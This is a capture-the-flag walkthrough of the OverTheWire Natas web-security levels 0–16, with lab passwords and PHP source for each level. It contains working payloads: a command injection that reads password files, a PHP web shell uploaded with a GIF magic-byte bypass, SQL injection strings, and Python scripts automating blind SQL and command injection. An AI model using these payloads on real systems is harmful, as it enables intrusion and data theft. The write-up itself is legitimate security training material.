# Natas

## natas0
```
natas0:natas0
```
The password to natas1 is found in the HTML source code.<br>

## natas1
```
natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto
```
The password to the next level is also in the source code except this time you have to use CTRL+U.<br>

## natas2
```
natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi
```
Looking at the source code, we no longer have any comments but we do have an image in the <b>file</b> directory. Navigating to the directory shows a text file <b>user.txt</b> which contains the flag.

## natas3
```
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
```
In the source code, there is a hint:
```html
<!-- No more information leaks!! Not even Google will find it this time... -->
```
Google spiders are constantly crawling over the web. In order for websites to prevent spiders from accessing private resources a text file "robots.txt" is created which shows all resources google shouldn't scan. Navigating to that gives us:
```
User-agent: *
Disallow: /s3cr3t/
```
The directory <b>s3cr3t</b> contains a text file <b>user.txt</b> which contains our flag.

## natas4
```
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```
On the main page, it tells us 
```
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/" 
```
Which probably means the <b>Referer</b> HTTP header needs to be set to <b>http://natas5.natas.labs.overthewire.org/</b>. Using Burpsuite, you can intercept the HTTP request header and add the <b>Referer</b> field. This gives the flag.

## natas5
```
natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```
We are prompted with
```
Access disallowed. You are not logged in
```
Because there is no login form, the user must be authenticated a different way. One of the best ways to track this is with cookies. Checking the cookie jar shows there is a cookie <b>loggedin</b> which is set to 0. Setting <b>loggedin</b> to 1 and refreshing the page gives the flag.

## natas6
```
natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```
There is an input field and a <b>view source</b> link which shows the PHP source code for the page. 
```php
<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```
This is a simple authentication script which evaluates to true if the POST variable <b>secret</b> is equal to <b>$secret</b>. <b>includes/secret.inc</b> is included into this PHP script. Navigating here gives a blank page however looking at the source code shows the PHP variable <b>$secret</b> as <b>FOEIUWGHFEEUHOFUOIU</b>. Inputting this into the input field gives the flag.

## natas7
```
natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```
The main page has two hyperlinks <b>Home</b> and <b>About</b>. Viewing the source gives us a hint:
```html
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```
If I navigate to this page a 404 code is returned.<br>
Returning to the main page and clicking on one of the two hyperlinks gives an intereting hyperlink.
```
http://natas7.natas.labs.overthewire.org/index.php?page=about
```
It's clear that this is a <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion">Local File Inclusion (LFI)</a> vulnerability. Our payload is:
```
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```
which gives the flag.

## natas8
```
natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```
Again, I am presented with the same input form. Viewing the PHP source gives:
```php
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
The goal is to get the <b>secret</b> POST variable to equivalate to <b>$encodedSecret</b>. The POST variable gets encoded several times. The goal is to reverse the <b>$encodedSecret</b> variable through the three encoded schemes. I use <a href="https://gchq.github.io/CyberChef/">CyberChef</a> to build a "recipe".<br>
Starting with:
```
3d3d516343746d4d6d6c315669563362
```

First we go from Hexadecimal to ASCII.
```
==QcCtmMml1ViV3b
```
Which looks like a reversed Base64 string. We can re-reverse the string and base64 decode which gives.
```
oubWYf2kBq
```
Inputting this into the input field returns the flag.

## natas9
```
natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```
This has another input field except this time it looks more like a search bar. Putting in "elite" returns words containing the word "elite". We can view the source code again:
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
<a href="https://www.php.net/manual/en/function.passthru.php">passthru</a> is a PHP method which executes system commands. I control the <b>$key</b> variable with the GET variable <b>needle</b>. This is exemplified in the URL:
```
http://natas9.natas.labs.overthewire.org/?needle=elite&submit=Search
```
This seems like an <a href="https://owasp.org/www-community/attacks/Command_Injection">OS Command Injection</a>. We can escape the grep system command by using a semi-colon. Our final payload looks like:
```
; cat /etc/natas_webpass/natas10 #
```
Which gives the flag.

## natas10
```
natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```
The web-app is the same as in natas9. We can view the source.
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
This time all of the possible escape characters are blocked so I am forced to work with grep. With grep, you can supply as many files as you want. Our payload is:
```
u /etc/natas_webpass/natas11
```
Which greps the password file<br>

## natas11
```
natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```
On the main page we are given a hint
```
Cookies are protected by XOR encryption
```
We can also view the source code:
```php
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
	    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
	    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
	        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
	        $mydata['showpassword'] = $tempdata['showpassword'];
	        $mydata['bgcolor'] = $tempdata['bgcolor'];
	        }
	    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
?>
```
First thing to do is determine what the key is. This is easily accomplished because when XOR'ing you can determine what the third compenent is if you have the other two. So...<br>
plaintext ^ key = ciphertext<br>is equal to<br>plaintext ^ ciphertext = key<br>or<br>ciphertext ^ key = plaintext.<br>
I write my own php code to solve this:
```php
<?php

function xor_encrypt($in) {
    $plain_text = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));
    $encrypted_text = $in;
    $key = '';

    // Iterate through each character
    for($i=0; $i < strlen($encrypted_text); $i++) {
        $key .= $plain_text[$i] ^ $encrypted_text[$i % strlen($encrypted_text)];
    }

    return $key;
}

$encoded_data = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=";
$encoded_data = base64_decode($encoded_data);
$encoded_data = xor_encrypt($encoded_data);
echo $encoded_data;
?>
``` 
Which echos out: <b>qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq</b>. Making our key: <b>w8Jq</b><br>
Next I need to change create the cookie with "showpassword=yes" rather than "showpassword=no". This'll (hypothetically) make the password show. Making $key='w8Jq' and setting "showpassword=yes" yields: <b>ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK</b><br>Using this for the data cookie yields the password for the next stage.<br>
## natas12
```
natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
```
Source code for the page:
```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```
From examinig the code, this appears to be a file upload vulnerability. A path and filename are both given, thus we are able to execute whatever file is uploaded to the server. I create a small file which yields a webshell:
```php
<?php
    system($_GET["cmd"]);
?>
```
Everytime I upload this file though, the extension gets changed into a .jpg. I open BurpSuite and capture the HTTP POST request. 
```
POST /index.php HTTP/1.1
Host: natas12.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------364886043538294662382913278575
Content-Length: 521
Origin: http://natas12.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxMjpFRFhwMHBTMjZ3TEtIWnkxckRCUFVaazBSS2ZMR0lSMw==
Connection: close
Referer: http://natas12.natas.labs.overthewire.org/
Cookie: __utma=176859643.359785852.1644174450.1644174450.1644174450.1; __utmz=176859643.1644174450.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)
Upgrade-Insecure-Requests: 1

-----------------------------364886043538294662382913278575
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------364886043538294662382913278575
Content-Disposition: form-data; name="filename"

tescipab3s.jpg
-----------------------------364886043538294662382913278575
Content-Disposition: form-data; name="uploadedfile"; filename="readme.php"
Content-Type: application/x-php

<?php system($_GET["cmd"]); ?>

-----------------------------364886043538294662382913278575--
```
I change the tescipab3s.jpg to tescipab3s.php which seems to circumvent the issue. Navigating this this location and using: <b>http://natas12.natas.labs.overthewire.org/upload/tescipab3s.php?cmd=[COMMAND]</b> give me RCE. I can then display the password for the next level using: <b>http://natas12.natas.labs.overthewire.org/upload/n9tb0zl0l7.php?cmd=cat%20/etc/natas_webpass/natas13</b>

## natas13
```
natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```
The source code
```php
 <html>

<? 

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";    

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);
    
    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```
Looking this code, the only thing that is checked is the file type. You can trick file uploaders by changing the magic bytes of a file. Creating a php script:
```php
GIF89a;
<? system($_GET['cmd']); ?>
```
Should do the trick. Don't forget to change the extension in your proxy.

## natas14
```
natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```
Da Source code
```php

<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?>
```
This webapp does a SQL query without doing any protection from injections. Using the classical payload:
```sql
" OR 1=1-- -
```
Gets you the password

## nata15
```
natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```
Code
```php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);
    
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>

```
At first I thought this was a UNION based SQL injection because they gave you the name of the table and both rows. However, looking at the code there is no way for the results to be echoed out. Everything that is returned is hardcoded. If you put in a random user you'll get "This user doesn't exist" but if you input the classic SQL injection you get "This user exists". This is most likely a BLIND SQL injection where you can slowly reveal information using SQL wildcard.<br><br>
So if you inject:
```sql
natas16" AND password LIKE BINARY "W%";-- -
```
I write a small Python script to automate this and get the password
```python
#!/usr/bin/env python3
import requests
import string
import sys
from requests.auth import HTTPBasicAuth

url = "http://natas15.natas.labs.overthewire.org/index.php"
auth = HTTPBasicAuth('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
characters = string.ascii_letters + string.digits
username = ""

while True:
    for c in characters:
        payload = f'natas16" AND password LIKE BINARY "{username + c}%";-- -'
        data = {"username":payload}
        
        print(f"Trying... {payload}")

        r = requests.post(url,data=data,auth=auth)

        if ("This user exists." in r.text):
            username = username + c
            break
        elif (c == '9'):
            print(f"Password: {username}")
            sys.exit()
```

## natas16
```
natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```
The code:
```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>

```
The injection here is pretty interesting. For starters the payload being used <b>$(grep -E ^a.* /etc/natas_webpass/natas17)needle</b>. If this command evaluates to true and returns an "a", then the payload will be <b>grep -i aneedle dictionary.txt</b> which does not exist in dictionary.txt. If however the payload evaluates to false, then the payload will be <b>grep -i needle dictionary.txt</b> which does exist in dictionary.txt. Essentially, <b>if the inner grep passes, the outer grep will not meaning we are a step closer to leaking the password.</b><br>
My final script was this:
```python
#!/usr/bin/env python3

#=== Modules ===
import requests
import string
import sys
from requests.auth import HTTPBasicAuth

# === Authentication and characters for payload ===
auth = HTTPBasicAuth('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
characters = string.ascii_letters + string.digits
needle = ""

# === Driver loop ===
while True:
    for c in characters:
        url = f"http://natas16.natas.labs.overthewire.org/index.php?needle=$(grep -E ^{needle + c}.* /etc/natas_webpass/natas17)hacker"
        print(f"Trying... {url}")
        r = requests.get(url,auth=auth)

        # == Analyze request === 
        if ('hacker' not in r.text):
            needle += c 
            break
        elif (c == '9'):
            print(f"natas17 Password: {needle}")
            sys.exit()



```